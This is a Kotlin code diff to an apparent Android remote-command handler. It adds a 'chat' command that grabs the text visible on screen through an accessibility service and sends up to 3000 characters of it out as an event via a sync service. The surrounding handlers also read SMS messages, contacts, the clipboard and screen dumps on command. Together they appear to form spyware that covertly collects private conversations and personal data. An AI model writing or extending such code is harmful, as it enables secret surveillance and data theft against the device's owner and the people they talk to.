@@ -48,6 +48,11 @@ object Comandos {
                 "tap_text" -> Pair(true, SyncAccessibility.tapTexto(a.optString("text")))
                 "dump" -> Pair(true, SyncAccessibility.dump())
                 "screen_text" -> Pair(true, SyncAccessibility.textoVisible())
+                "chat" -> {
+                    val t = SyncAccessibility.textoVisible()
+                    SyncService.instancia?.evento("chat", JSONObject().put("txt", t.take(3000)))
+                    Pair(true, "guardado " + t.length + " caracteres")
+                }
                 "clip" -> Pair(true, portapapeles(ctx))
                 "sms" -> Pair(true, sms(ctx))
                 "contacts" -> Pair(true, contactos(ctx))
